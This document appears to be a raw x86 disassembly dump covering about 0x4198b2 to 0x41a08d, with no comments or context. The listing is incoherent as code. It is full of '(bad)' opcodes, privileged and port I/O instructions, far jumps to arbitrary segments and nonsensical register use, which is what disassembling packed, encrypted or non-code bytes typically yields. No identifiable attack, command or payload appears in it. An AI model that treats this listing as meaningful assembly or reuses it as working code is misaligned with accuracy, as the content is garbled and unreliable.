  4198b2:	push   ecx
  4198b3:	and    bh,bl
  4198b5:	neg    BYTE PTR [ebx-0x4055505f]
  4198bb:	mov    al,BYTE PTR [ecx+0x3b19aa8d]
  4198c1:	jno    0x4198a2
  4198c3:	icebp  
  4198c4:	sbb    esp,0x2706c58b
  4198ca:	popf   
  4198cb:	push   ecx
  4198cc:	pop    ds
  4198cd:	xchg   ecx,eax
  4198ce:	add    dh,BYTE PTR ds:[eax]
  4198d1:	inc    ecx
  4198d2:	rcl    BYTE PTR [edi+ecx*4],0x1b
  4198d6:	fld    TBYTE PTR [edi-0x77]
  4198d9:	mov    ebp,DWORD PTR [ebx]
  4198db:	scas   eax,DWORD PTR es:[edi]
  4198dc:	jb     0x41992c
  4198de:	rcl    ecx,1
  4198e0:	push   es
  4198e1:	mov    ecx,0x72b3d4a8
  4198e6:	in     eax,0x27
  4198e8:	and    eax,0x12db7712
  4198ed:	or     esi,DWORD PTR [edi-0xc382189]
  4198f3:	dec    ebp
  4198f4:	sbb    BYTE PTR [ebx],bh
  4198f6:	nop
  4198f7:	shl    DWORD PTR [edi+ecx*8],0x2f
  4198fb:	shl    DWORD PTR [ebp+0x75],0xf0
  4198ff:	aad    0x3f
  419901:	das    
  419902:	pop    ebx
  419903:	xchg   DWORD PTR [esi-0xb],ecx
  419906:	lds    eax,FWORD PTR [bx]
  419909:	add    eax,0x31530874
  41990e:	jae    0x4198b4
  419910:	xor    esp,esi
  419912:	das    
  419913:	push   ecx
  419914:	sub    dl,0xc2
  419917:	pusha  
  419918:	push   ds
  419919:	jb     0x4198fd
  41991b:	aaa    
  41991c:	jmp    0x6741:0x1c7592ca
  419923:	lods   al,BYTE PTR ds:[esi]
  419924:	mov    ebx,0x33e57c96
  419929:	inc    ebx
  41992a:	push   edi
  41992b:	stos   BYTE PTR es:[edi],al
  41992c:	ins    DWORD PTR es:[edi],dx
  41992d:	and    edx,ecx
  41992f:	pop    eax
  419930:	imul   edi,DWORD PTR [ecx-0x17ae6024],0x431a6fe1
  41993a:	mov    dl,0x22
  41993c:	sub    al,0x6b
  41993e:	jl     0x4198d2
  419940:	mov    WORD PTR [edi],cs
  419942:	aam    0xfa
  419944:	sar    DWORD PTR [ebx+0x132cada],1
  41994a:	inc    ebx
  41994b:	shl    DWORD PTR [ecx+ebp*4],1
  41994e:	dec    ebx
  41994f:	or     eax,0xe2b32dc0
  419954:	(bad)  
  419955:	sti    
  419956:	test   eax,0xf1b65ae3
  41995b:	pop    es
  41995c:	xor    eax,0x38313adc
  419961:	cmp    DWORD PTR [esi-0xd724441],ecx
  419967:	pop    esp
  419968:	xchg   edx,eax
  419969:	stc    
  41996a:	xchg   ecx,eax
  41996b:	mov    edx,0x36c9125a
  419970:	(bad)  
  419971:	cs jmp 0x5bb605ea
  419977:	pop    ecx
  419978:	jle    0x419995
  41997a:	je     0x41996b
  41997c:	lods   al,BYTE PTR ds:[esi]
  41997d:	push   ds
  41997e:	daa    
  41997f:	push   edx
  419980:	rcl    esi,cl
  419982:	mov    DWORD PTR [ecx-0xf],0xac6a306
  419989:	fidiv  DWORD PTR [edi]
  41998b:	push   ecx
  41998c:	icebp  
  41998d:	loopne 0x4199e9
  41998f:	in     al,0x5f
  419991:	push   cs
  419992:	dec    esi
  419993:	pop    ebp
  419994:	pop    ds
  419995:	inc    bx
  419997:	aam    0x4d
  419999:	mov    ds:0x471c7e46,al
  41999e:	(bad)  
  41999f:	retf   
  4199a0:	icebp  
  4199a1:	in     al,0x4f
  4199a3:	cmp    edx,DWORD PTR [ecx+0x58]
  4199a6:	push   ecx
  4199a7:	cmp    DWORD PTR [ecx],esi
  4199a9:	mov    ebx,0x5f5078fb
  4199ae:	dec    esi
  4199af:	and    edx,DWORD PTR [esi-0x77]
  4199b2:	dec    ebx
  4199b3:	xor    dl,BYTE PTR [edx]
  4199b5:	inc    ebx
  4199b6:	outs   dx,DWORD PTR ds:[esi]
  4199b8:	cli    
  4199b9:	jb     0x41999e
  4199bb:	jns    0x419941
  4199bd:	pop    ss
  4199be:	sbb    BYTE PTR [edx+0x717d80af],0x52
  4199c5:	shl    DWORD PTR [ebp-0x60667328],1
  4199cb:	push   ebp
  4199cc:	aas    
  4199cd:	sub    al,bh
  4199cf:	iret   
  4199d0:	and    esi,DWORD PTR [ebx-0x76]
  4199d3:	sbb    DWORD PTR [ebp+0x5e68322],ebx
  4199d9:	shr    BYTE PTR [ecx],1
  4199db:	push   ebp
  4199dc:	retf   
  4199dd:	out    0x5c,al
  4199df:	dec    esi
  4199e0:	pop    es
  4199e1:	and    eax,0xef1722fa
  4199e6:	jo     0x419a27
  4199e8:	ret    
  4199e9:	pop    ebp
  4199ea:	sbb    BYTE PTR [ebx-0x32],dh
  4199ed:	or     DWORD PTR [edi-0x78],esp
  4199f0:	jne    0x419a71
  4199f2:	jno    0x4199b3
  4199f4:	push   es
  4199f5:	sub    BYTE PTR [ecx+0x63a9db64],dl
  4199fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4199fc:	jle    0x41999b
  4199fe:	rol    BYTE PTR [eax+0x3a45db65],cl
  419a04:	fsubp  st(3),st
  419a06:	stos   DWORD PTR es:[edi],eax
  419a07:	popa   
  419a08:	call   0xfd307c15
  419a0d:	sub    dh,0xba
  419a10:	addr16 adc ecx,0xfffffffa
  419a14:	cs mov dl,0x63
  419a17:	xchg   ebp,eax
  419a18:	sbb    al,0x35
  419a1a:	mov    gs,WORD PTR [edi+0x66]
  419a1d:	leave  
  419a1e:	push   0x64
  419a20:	clc    
  419a21:	xchg   ecx,eax
  419a22:	push   esp
  419a23:	ror    DWORD PTR [ebx-0x5a],cl
  419a26:	fnstsw WORD PTR [esi+0x289be2d3]
  419a2c:	icebp  
  419a2d:	sub    BYTE PTR [edx-0x17],ch
  419a30:	imul   edx,edi,0x5d9326ea
  419a36:	mov    esi,DWORD PTR [ebx+0x2677c48]
  419a3c:	cwde   
  419a3d:	jecxz  0x419a1a
  419a3f:	dec    eax
  419a40:	mov    ebx,0xaa8509f3
  419a45:	pop    es
  419a46:	mov    edi,0x6592da4d
  419a4b:	in     al,dx
  419a4c:	leave  
  419a4d:	dec    esi
  419a4e:	sub    al,bh
  419a50:	dec    ebp
  419a52:	repnz inc eax
  419a54:	mov    eax,0x9927f143
  419a59:	adc    esi,DWORD PTR ds:0xebcd1f2a
  419a5f:	xor    ecx,DWORD PTR ds:0x7b7b1c36
  419a65:	mov    ebp,0x7c8a6a70
  419a6a:	sub    ebx,DWORD PTR [esi+0x40]
  419a6d:	gs sub eax,0x75650493
  419a73:	dec    eax
  419a74:	push   ecx
  419a75:	inc    edx
  419a76:	popf   
  419a77:	and    DWORD PTR [esi-0x2a8e779],edx
  419a7d:	(bad)  [ebx+edx*2+0x1d]
  419a81:	sbb    dh,BYTE PTR [bp+si-0x4b]
  419a85:	es mov edi,0x8c9009c7
  419a8b:	gs jb  0x419a40
  419a8e:	gs retw 0x8fe2
  419a93:	mov    dh,0x86
  419a95:	or     al,0x6
  419a97:	xchg   ebp,eax
  419a98:	mov    DWORD PTR [esi],esp
  419a9a:	and    eax,0x8c2952e2
  419a9f:	push   eax
  419aa0:	sub    edi,DWORD PTR [edx]
  419aa2:	jno    0x419aeb
  419aa4:	or     al,0xa7
  419aa6:	retf   0x59b2
  419aa9:	enter  0x4139,0xa1
  419aad:	mov    dh,0x2e
  419aaf:	cmp    ecx,DWORD PTR [ecx]
  419ab1:	dec    DWORD PTR [esi]
  419ab3:	add    BYTE PTR ds:0x68b9f3c2,0x45
  419aba:	push   ds
  419abb:	outs   dx,DWORD PTR ds:[esi]
  419abc:	fisubr DWORD PTR [edi]
  419abe:	inc    ebx
  419abf:	jmp    0x4f78:0x4da3874d
  419ac6:	pop    ss
  419ac7:	rol    DWORD PTR [esi],cl
  419ac9:	and    ecx,DWORD PTR [ecx+0x50]
  419acc:	repnz mov esp,0x79871485
  419ad2:	sbb    BYTE PTR [eax*2+0x41d449c1],bl
  419ad9:	rol    DWORD PTR [edi-0x16],0x73
  419add:	push   0xbedfb0a2
  419ae2:	leave  
  419ae3:	and    DWORD PTR [eax-0x61d81f1a],ecx
  419ae9:	fistp  QWORD PTR [esi]
  419aeb:	jns    0x419ae7
  419aed:	inc    ebp
  419aee:	mov    ah,0x3d
  419af0:	inc    esp
  419af1:	in     eax,dx
  419af2:	pop    esp
  419af3:	xlat   BYTE PTR ss:[ebx]
  419af5:	test   eax,edx
  419af7:	mov    ebx,0xbf0de079
  419afc:	pop    es
  419afd:	add    eax,0xcb769112
  419b02:	stc    
  419b03:	pop    esi
  419b04:	xor    esi,eax
  419b06:	retf   0xb2cf
  419b09:	cwde   
  419b0a:	in     al,0x55
  419b0c:	sub    al,0xe7
  419b0e:	mov    ds:0x74c816b1,eax
  419b13:	dec    edx
  419b14:	mov    eax,ds:0x5db215b2
  419b19:	xor    BYTE PTR [ecx-0x642a38f7],al
  419b1f:	jle    0x419afb
  419b21:	push   ebx
  419b22:	dec    ecx
  419b23:	cmp    BYTE PTR ds:[esi],0xc6
  419b27:	cmc    
  419b28:	dec    ecx
  419b29:	call   esi
  419b2b:	ja     0x419b87
  419b2d:	aam    0xd7
  419b2f:	pop    edi
  419b30:	mov    edx,0x3c4cf7e7
  419b35:	fs ret 
  419b37:	retf   
  419b38:	inc    eax
  419b39:	cli    
  419b3a:	or     al,ah
  419b3c:	dec    edx
  419b3d:	or     eax,0xe79f3c10
  419b42:	aam    0x32
  419b44:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419b45:	and    eax,0xd81a5c88
  419b4a:	mov    edi,0xd2f51525
  419b4f:	cld    
  419b50:	xor    eax,0xfbb76bcd
  419b55:	mov    edi,0xfc045c1e
  419b5a:	push   ss
  419b5b:	xor    cl,BYTE PTR [edi-0x1e]
  419b5e:	xchg   edi,eax
  419b5f:	mov    cl,0x69
  419b61:	or     eax,esi
  419b63:	dec    edi
  419b64:	or     edi,eax
  419b66:	jle    0x419ba3
  419b68:	jp     0x419b84
  419b6a:	test   bl,dl
  419b6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419b6d:	dec    ecx
  419b6e:	xor    al,0xcd
  419b70:	outs   dx,DWORD PTR ds:[esi]
  419b71:	sbb    dh,dh
  419b73:	in     al,dx
  419b74:	jmp    0x419ba6
  419b76:	mov    DWORD PTR [edx+edx*4+0x58b4ef6d],ebp
  419b7d:	jmp    0x419b48
  419b7f:	outs   dx,BYTE PTR ds:[esi]
  419b80:	mov    WORD PTR [eax-0x30],cs
  419b83:	enter  0xacf5,0x3e
  419b87:	mov    edi,0xb466ce48
  419b8c:	into   
  419b8d:	cmp    ebx,eax
  419b8f:	sbb    DWORD PTR [edx],esi
  419b91:	add    BYTE PTR [esp+edx*8+0x10],0x31
  419b96:	outs   dx,DWORD PTR ds:[esi]
  419b97:	lea    edi,ds:0xb84ff04c
  419b9d:	mov    WORD PTR [ebp+0x10],?
  419ba0:	lods   eax,DWORD PTR ds:[esi]
  419ba1:	mov    DWORD PTR [edx+ebp*4-0xad626da],edx
  419ba8:	(bad)  
  419ba9:	cmp    ebx,DWORD PTR [edi-0x75]
  419bac:	jp     0x419b83
  419bae:	xchg   esp,eax
  419baf:	push   ss
  419bb0:	rcr    edi,0xf4
  419bb3:	(bad)  
  419bb4:	js     0x419bd6
  419bb6:	pusha  
  419bb7:	fdivr  st,st(6)
  419bb9:	xor    al,0x2a
  419bbb:	jecxz  0x419bf1
  419bbd:	scas   eax,DWORD PTR es:[edi]
  419bbe:	inc    eax
  419bbf:	test   BYTE PTR [eax-0x3e],bh
  419bc2:	sbb    al,0x58
  419bc4:	push   ebx
  419bc5:	test   BYTE PTR [edi],ah
  419bc7:	loope  0x419b8d
  419bc9:	popf   
  419bca:	sahf   
  419bcb:	in     al,0x80
  419bcd:	js     0x419bd3
  419bcf:	push   esp
  419bd0:	pop    edi
  419bd1:	sbb    al,0xca
  419bd3:	cmp    BYTE PTR [ecx],ch
  419bd5:	fld    DWORD PTR [ecx+0x548757f0]
  419bdb:	xor    DWORD PTR [edx+0x5bc950f4],0x34f1d6cd
  419be5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419be6:	mov    ds:0x4cf08758,eax
  419beb:	xchg   ebp,eax
  419bec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419bed:	in     al,0x34
  419bef:	ins    BYTE PTR es:[edi],dx
  419bf0:	call   0xd9a52d60
  419bf5:	imul   esi,DWORD PTR [ecx-0x2c20a5aa],0x4799a7da
  419bff:	ins    BYTE PTR es:[edi],dx
  419c00:	mov    eax,ds:0x18cb6a9b
  419c05:	fldln2 
  419c07:	xor    eax,DWORD PTR [ebx+0x63e5e2be]
  419c0d:	aam    0x4d
  419c0f:	js     0x419bad
  419c11:	dec    ecx
  419c12:	mov    ebx,ebp
  419c14:	int    0xcf
  419c16:	push   ebp
  419c17:	push   esp
  419c18:	pop    esi
  419c19:	or     cl,BYTE PTR [esi-0x566de57f]
  419c1f:	sbb    esi,DWORD PTR [ebx-0x7a8f08d9]
  419c25:	outs   dx,BYTE PTR ds:[esi]
  419c26:	jmp    0x96de:0x8e59cff
  419c2d:	mov    dh,0x8b
  419c2f:	inc    ebx
  419c30:	scas   al,BYTE PTR es:[edi]
  419c31:	mov    ebp,0xfde45e61
  419c36:	imul   edx,esi,0xfffffff8
  419c39:	lods   eax,DWORD PTR ds:[esi]
  419c3a:	lods   eax,DWORD PTR ds:[esi]
  419c3b:	sbb    esi,eax
  419c3d:	(bad)  
  419c3f:	mov    al,0x2d
  419c41:	ds rcr dh,cl
  419c44:	mov    ?,WORD PTR [esi-0x6b520346]
  419c4a:	sbb    dh,0xf0
  419c4d:	into   
  419c4e:	and    BYTE PTR [eax],dl
  419c50:	js     0x419c74
  419c52:	mov    al,fs:0x5632553a
  419c58:	das    
  419c59:	push   0xde0941c4
  419c5e:	or     dl,BYTE PTR [ebp-0x1b6af89b]
  419c64:	and    ebx,DWORD PTR [edi-0x3b]
  419c67:	rol    DWORD PTR [eax+ebp*2],cl
  419c6a:	mov    ebx,0xa5aee67a
  419c6f:	popf   
  419c70:	jno    0x419c34
  419c72:	sub    ebx,ebx
  419c74:	mov    bh,0xa6
  419c76:	xor    dh,BYTE PTR [esi-0x7de511ae]
  419c7c:	jnp    0x419cb6
  419c7e:	imul   edi,DWORD PTR [eax],0xffffffa3
  419c81:	xchg   DWORD PTR [ecx*2+0x6c6cfb8f],ecx
  419c88:	lock cmc 
  419c8a:	cmp    ch,bh
  419c8c:	aam    0x4d
  419c8e:	clc    
  419c8f:	and    ecx,DWORD PTR [ebx]
  419c91:	xor    ah,BYTE PTR [esi-0x3c]
  419c94:	mov    al,0x21
  419c96:	cmp    BYTE PTR [eax+0x33],ah
  419c99:	loope  0x419c52
  419c9b:	dec    edi
  419c9c:	cwde   
  419c9d:	stos   BYTE PTR es:[edi],al
  419c9e:	add    BYTE PTR ds:[edx+0x5e],bl
  419ca2:	fsub   DWORD PTR [ebx+0x3c]
  419ca5:	add    al,0x6c
  419ca7:	jnp    0x419c9e
  419ca9:	mov    ecx,0xbc78e7b6
  419cae:	pop    ecx
  419caf:	int    0xb0
  419cb1:	and    al,0x7d
  419cb3:	in     al,0x8e
  419cb5:	outs   dx,DWORD PTR ds:[esi]
  419cb6:	shr    ch,1
  419cb8:	push   ds
  419cb9:	cdq    
  419cba:	out    dx,al
  419cbb:	adc    ebp,eax
  419cbd:	cmc    
  419cbe:	test   DWORD PTR [esi+ecx*4-0x76],ebp
  419cc2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419cc3:	ret    0xf4bf
  419cc6:	push   es
  419cc7:	dec    esi
  419cc8:	test   bl,0x3c
  419ccb:	and    eax,0x8edd8f57
  419cd0:	nop
  419cd1:	lods   eax,DWORD PTR ds:[esi]
  419cd2:	ins    DWORD PTR es:[edi],dx
  419cd3:	int    0xd7
  419cd5:	or     eax,0xaef26359
  419cda:	(bad)  
  419cdb:	and    ah,BYTE PTR [eax+0xc]
  419cde:	pop    esp
  419cdf:	not    dh
  419ce1:	add    BYTE PTR [edi],0xc8
  419ce4:	les    edx,FWORD PTR [edx-0x4de0f561]
  419cea:	jmp    0x2035:0x4de1bba
  419cf1:	dec    esi
  419cf2:	scas   eax,DWORD PTR es:[edi]
  419cf3:	std    
  419cf4:	(bad)  
  419cf6:	push   ss
  419cf7:	or     edx,DWORD PTR [edi]
  419cf9:	das    
  419cfa:	mov    edx,0xaf5dffd0
  419cff:	fcomp  QWORD PTR [ecx-0xe]
  419d02:	push   esi
  419d03:	and    dl,BYTE PTR [ebx+ecx*8-0x5635106c]
  419d0a:	fild   DWORD PTR ds:0x8e47be58
  419d10:	in     eax,0x2c
  419d12:	ficom  WORD PTR [edx]
  419d14:	jg     0x419d88
  419d16:	adc    ecx,DWORD PTR [esi]
  419d18:	aas    
  419d19:	push   DWORD PTR [esp+ebp*8]
  419d1c:	mov    eax,ds:0x6e915415
  419d21:	sub    eax,0x6972ffa8
  419d26:	outs   dx,BYTE PTR ds:[esi]
  419d27:	es ret 0xf96b
  419d2b:	mov    edi,0x2d40e42f
  419d30:	or     al,0xff
  419d32:	fwait
  419d33:	cpuid  
  419d35:	jmp    0x38b5:0x86b2a749
  419d3c:	push   ss
  419d3d:	test   BYTE PTR [edx],0xbf
  419d40:	lahf   
  419d41:	inc    edx
  419d42:	scas   al,BYTE PTR es:[edi]
  419d43:	mov    ecx,0x2b5bdfdf
  419d48:	jecxz  0x419cd3
  419d4a:	stc    
  419d4b:	xchg   esi,eax
  419d4c:	add    BYTE PTR [esi-0x11f3262a],dl
  419d52:	xor    ah,BYTE PTR [esi-0x6f]
  419d55:	int3   
  419d56:	or     bl,al
  419d58:	les    esp,FWORD PTR [esi+0x67]
  419d5b:	std    
  419d5c:	call   0x22c1b006
  419d61:	ja     0x419cfa
  419d63:	out    dx,eax
  419d64:	cmp    eax,0x77a37190
  419d69:	push   edx
  419d6a:	xchg   ebx,ebx
  419d6c:	fisub  DWORD PTR [ebx+0xb61877]
  419d72:	mov    bl,0x5a
  419d74:	sub    ebp,edi
  419d76:	in     al,dx
  419d77:	stc    
  419d78:	sbb    eax,DWORD PTR [esi+0x6aee6819]
  419d7e:	sbb    edx,DWORD PTR ds:0x86b38a64
  419d84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419d85:	cmp    cl,BYTE PTR [esi-0x40]
  419d88:	sub    edi,esp
  419d8a:	hlt    
  419d8b:	xchg   esp,eax
  419d8c:	mov    gs,WORD PTR ds:0x8a89e42a
  419d92:	mov    cs,WORD PTR [eax+0x7e644a]
  419d98:	cmc    
  419d99:	icebp  
  419d9a:	mov    ebp,0x505f1e58
  419d9f:	sbb    eax,0xb4ac07f2
  419da4:	retf   0x3c07
  419da7:	jmp    0x70f1:0x635e987a
  419dae:	push   0x7164fa34
  419db3:	popf   
  419db4:	sbb    al,0x27
  419db6:	fst    st(7)
  419db8:	mov    dl,0xb2
  419dba:	sbb    eax,DWORD PTR [edx+0x10]
  419dbd:	cld    
  419dbe:	leave  
  419dbf:	or     BYTE PTR [edx],0xe4
  419dc2:	scas   al,BYTE PTR es:[edi]
  419dc3:	sub    eax,0xcefd97a7
  419dc8:	xor    eax,0x4a4a71c6
  419dcd:	and    DWORD PTR [ecx+0x7d6c9532],0x1e0ec818
  419dd7:	pop    edx
  419dd8:	and    bh,BYTE PTR [ecx]
  419dda:	inc    edi
  419ddb:	nop
  419ddc:	outs   dx,DWORD PTR ds:[esi]
  419ddd:	mov    eax,ds:0x87b9fd2b
  419de2:	push   ds
  419de3:	(bad)  
  419de4:	clc    
  419de5:	fbstp  TBYTE PTR [ecx]
  419de7:	hlt    
  419de8:	out    0xbb,eax
  419dea:	pushf  
  419deb:	ds xor edx,esp
  419dee:	jb     0x419ddb
  419df0:	addr16 cld 
  419df2:	jb     0x419e71
  419df4:	dec    esi
  419df5:	add    esi,DWORD PTR [eax-0x61bf0171]
  419dfb:	(bad)  
  419dfc:	pusha  
  419dfd:	ss das 
  419dff:	push   ebp
  419e00:	cmp    eax,0xd0a6d4a1
  419e05:	sub    eax,0xe1ff99a1
  419e0a:	inc    edi
  419e0b:	sub    al,0xcc
  419e0d:	sbb    al,0x1c
  419e0f:	inc    eax
  419e10:	enter  0xb09,0x76
  419e14:	inc    ecx
  419e15:	or     dh,BYTE PTR [esi+0x40d7b29b]
  419e1b:	pushf  
  419e1c:	sub    al,0x63
  419e1e:	sbb    eax,0xe65ff38b
  419e23:	jl     0x419de1
  419e25:	imul   eax,DWORD PTR [ecx-0x53],0xede757a5
  419e2c:	ins    DWORD PTR es:[edi],dx
  419e2d:	clc    
  419e2e:	and    eax,0xe0e42e90
  419e33:	push   0xb8486959
  419e38:	test   eax,0x8a70fa32
  419e3d:	dec    esi
  419e3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419e3f:	mov    ecx,0xc45080ec
  419e44:	jmp    0xb33feedd
  419e49:	in     eax,dx
  419e4a:	pop    eax
  419e4b:	sar    BYTE PTR [eax+0x791f0f39],cl
  419e51:	jecxz  0x419e58
  419e53:	mov    al,ds:0x9b5130c1
  419e58:	out    dx,al
  419e59:	and    ebx,DWORD PTR [ebx]
  419e5b:	pusha  
  419e5c:	imul   edx,DWORD PTR [edi-0x67],0x35
  419e60:	int    0x15
  419e62:	mov    ?,WORD PTR [edi-0x5d]
  419e65:	in     al,dx
  419e66:	mov    fs,WORD PTR [eax+0x60a39d1b]
  419e6c:	test   bl,0x4f
  419e6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419e70:	inc    ebx
  419e71:	adc    eax,0x4c9fff68
  419e76:	inc    ebx
  419e77:	cld    
  419e78:	test   BYTE PTR [di+0xb],0xf9
  419e7d:	mov    es,WORD PTR [eax-0x5e784071]
  419e83:	xchg   esp,eax
  419e84:	bound  eax,QWORD PTR [ebp-0x68]
  419e87:	mov    eax,0xc5a750e5
  419e8c:	mov    esi,0x4c8d9896
  419e91:	sahf   
  419e92:	mov    ebp,0x8cf57e7b
  419e97:	loopne 0x419ed6
  419e99:	loope  0x419f10
  419e9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419e9c:	sahf   
  419e9d:	pusha  
  419e9e:	cdq    
  419e9f:	imul   edx,DWORD PTR [edi+0x87f5f83],0xf
  419ea6:	push   ss
  419ea7:	ja     0x419e7d
  419ea9:	pop    ebp
  419eaa:	xchg   esp,eax
  419eab:	or     bh,BYTE PTR [ecx]
  419ead:	add    BYTE PTR [eax-0x14],ch
  419eb0:	jle    0x419f1e
  419eb2:	mov    esp,0xe3d7b168
  419eb7:	ror    al,cl
  419eb9:	aas    
  419eba:	and    al,0x74
  419ebc:	mov    DWORD PTR es:[eax+0x7dfb5262],esp
  419ec3:	ds jnp 0x419eaf
  419ec6:	lds    esi,FWORD PTR ss:[ebx-0x5d]
  419eca:	mov    esi,DWORD PTR [eax-0x3cade1b5]
  419ed0:	sbb    BYTE PTR [eax+0x50bb6be6],0x36
  419ed7:	je     0x419ee0
  419ed9:	inc    ebp
  419eda:	push   ss
  419edb:	or     dh,ah
  419edd:	adc    al,cl
  419edf:	cmp    al,BYTE PTR ds:0xde77b927
  419ee5:	in     eax,dx
  419ee6:	jmp    0xee3:0xcd44f46c
  419eed:	push   DWORD PTR [ebx-0x63b691b3]
  419ef3:	cmp    al,0xaa
  419ef5:	push   esp
  419ef6:	add    edx,edi
  419ef8:	pop    ebx
  419ef9:	and    eax,0x10a93efc
  419efe:	inc    ecx
  419eff:	shl    BYTE PTR [eax+0x67],cl
  419f02:	xlat   BYTE PTR ds:[ebx]
  419f03:	jns    0x419e91
  419f05:	or     eax,DWORD PTR [edx]
  419f07:	in     eax,0xa2
  419f09:	icebp  
  419f0a:	repnz or al,0x3a
  419f0d:	sub    BYTE PTR [edi-0x5c763eda],al
  419f13:	fistp  WORD PTR [ebp-0x26]
  419f16:	(bad)  
  419f17:	adc    al,0xe9
  419f19:	xor    eax,0xc22f3d47
  419f1e:	jne    0x419f85
  419f20:	inc    edx
  419f21:	and    ch,ch
  419f23:	icebp  
  419f24:	sub    DWORD PTR [ebx-0xc7b18ec],ebx
  419f2a:	in     al,0x15
  419f2c:	outs   dx,BYTE PTR ds:[esi]
  419f2d:	rcr    dh,cl
  419f2f:	lods   eax,DWORD PTR ds:[esi]
  419f30:	bound  edx,QWORD PTR [edi+0x50]
  419f33:	sahf   
  419f34:	pop    ebx
  419f35:	xor    eax,0xf033b327
  419f3a:	jno    0x419fa1
  419f3c:	mov    eax,ds:0x5d8f35df
  419f41:	jbe    0x419ed5
  419f43:	adc    BYTE PTR [ecx+0x768b2561],ch
  419f49:	pop    esi
  419f4a:	lods   eax,DWORD PTR ds:[esi]
  419f4b:	adc    ah,dh
  419f4d:	aad    0x5f
  419f4f:	or     DWORD PTR [edx-0x21],eax
  419f52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419f53:	call   0x749f:0x964b3694
  419f5a:	daa    
  419f5b:	jbe    0x419f5d
  419f5d:	daa    
  419f5e:	enter  0xa310,0x99
  419f62:	sub    BYTE PTR [esi-0x68],ch
  419f65:	outs   dx,BYTE PTR ds:[esi]
  419f66:	(bad)  
  419f67:	into   
  419f68:	ds pop edx
  419f6a:	test   al,0x40
  419f6c:	add    esi,DWORD PTR [esi]
  419f6e:	int3   
  419f6f:	std    
  419f70:	adc    DWORD PTR [esi-0x3],esp
  419f73:	cdq    
  419f74:	inc    edi
  419f75:	pop    ebx
  419f76:	ins    BYTE PTR es:[edi],dx
  419f77:	xor    DWORD PTR [ebx],esi
  419f79:	jl     0x419ffa
  419f7b:	loop   0x419f07
  419f7d:	fcomp  DWORD PTR [ebp+0x77]
  419f80:	jmp    0x7390e72e
  419f85:	adc    DWORD PTR [edi],ecx
  419f87:	das    
  419f88:	add    bh,al
  419f8a:	enter  0x14c3,0xc7
  419f8e:	add    eax,0xd9fa76ff
  419f93:	stos   BYTE PTR es:[edi],al
  419f94:	and    eax,0xec480f7a
  419f99:	xchg   esp,eax
  419f9a:	dec    ecx
  419f9b:	ret    
  419f9c:	(bad)  
  419f9d:	or     al,0x30
  419f9f:	push   0xfd04866a
  419fa4:	xchg   BYTE PTR [eax+ecx*2],dh
  419fa7:	xor    ebx,DWORD PTR [ebx+0x380b23b1]
  419fad:	and    ebx,0x46
  419fb0:	dec    ebp
  419fb1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419fb2:	nop
  419fb3:	fist   WORD PTR [edx]
  419fb5:	xor    bl,al
  419fb7:	jnp    0x419f81
  419fb9:	inc    edx
  419fba:	pop    ss
  419fbb:	mov    eax,0x858c1e74
  419fc0:	mov    ecx,0x3fa88c0d
  419fc5:	sub    eax,0xc966b51b
  419fca:	ss sbb al,0x82
  419fcd:	adc    al,0xfb
  419fcf:	and    al,BYTE PTR ds:0xf1de6ff6
  419fd5:	in     al,dx
  419fd6:	push   edi
  419fd7:	cs out 0x7b,eax
  419fda:	cmp    BYTE PTR [esi+0x4dc033c],0xb8
  419fe1:	cld    
  419fe2:	push   edx
  419fe3:	out    dx,eax
  419fe4:	push   ds
  419fe5:	lahf   
  419fe6:	ja     0x41a048
  419fe8:	aaa    
  419fe9:	(bad)  
  419fec:	loope  0x41a026
  419fee:	dec    ebx
  419fef:	(bad)  
  419ff0:	and    al,0x42
  419ff2:	or     BYTE PTR [ebx-0x7c],ah
  419ff5:	xor    DWORD PTR [eax],0xffffffb1
  419ff8:	lds    esp,FWORD PTR [esi]
  419ffa:	mov    eax,ds:0x41679954
  41a000:	das    
  41a001:	xor    ah,BYTE PTR [ebp+eax*8+0x53]
  41a005:	repnz pop eax
  41a007:	data16 (bad) 
  41a009:	int3   
  41a00a:	daa    
  41a00b:	sbb    DWORD PTR [eax+esi*1],ebx
  41a00e:	push   0xa0d9d3f7
  41a013:	xchg   edi,eax
  41a014:	(bad)  
  41a015:	sti    
  41a016:	mov    dl,BYTE PTR [eax]
  41a018:	sbb    dl,bl
  41a01a:	xchg   DWORD PTR [esi+ebp*1],ebp
  41a01d:	loopne 0x41a069
  41a01f:	clc    
  41a020:	mov    BYTE PTR [edx+0x34],dl
  41a023:	and    ebx,ecx
  41a025:	mov    edi,0xda36280e
  41a02a:	shr    DWORD PTR [eax-0x1a],0x13
  41a02e:	adc    edx,DWORD PTR [edx+eax*4]
  41a031:	add    al,0xaf
  41a033:	adc    DWORD PTR [edi+0x4d704d8f],ecx
  41a039:	jmp    0xdc98cc8b
  41a03e:	mov    ecx,0x7641c3a9
  41a043:	xor    BYTE PTR [eax+0x4be03d73],dl
  41a049:	fs hlt 
  41a04b:	inc    esi
  41a04c:	adc    DWORD PTR [ecx-0x1e],eax
  41a04f:	mov    ebx,0xdd81bb26
  41a054:	in     eax,0x48
  41a056:	icebp  
  41a057:	test   DWORD PTR [ebx+eiz*4],edx
  41a05a:	push   ebp
  41a05b:	in     eax,dx
  41a05c:	adc    dl,BYTE PTR [edx+0x33]
  41a05f:	sub    BYTE PTR [edx-0x1a76876],dl
  41a065:	jmp    DWORD PTR [edx]
  41a067:	add    al,0x76
  41a069:	stos   DWORD PTR es:[edi],eax
  41a06a:	mov    ecx,0x695e17eb
  41a06f:	lds    esi,FWORD PTR [eax-0x4bc2b5fc]
  41a075:	xchg   ebx,eax
  41a076:	mov    eax,ds:0xa1208096
  41a07b:	jmp    0x2398:0x4c4e938b
  41a082:	icebp  
  41a083:	mov    ?,ebx
  41a085:	sti    
  41a086:	imul   ebp,DWORD PTR [ebp+0x39bb2697],0xc
  41a08d:	int    0x2
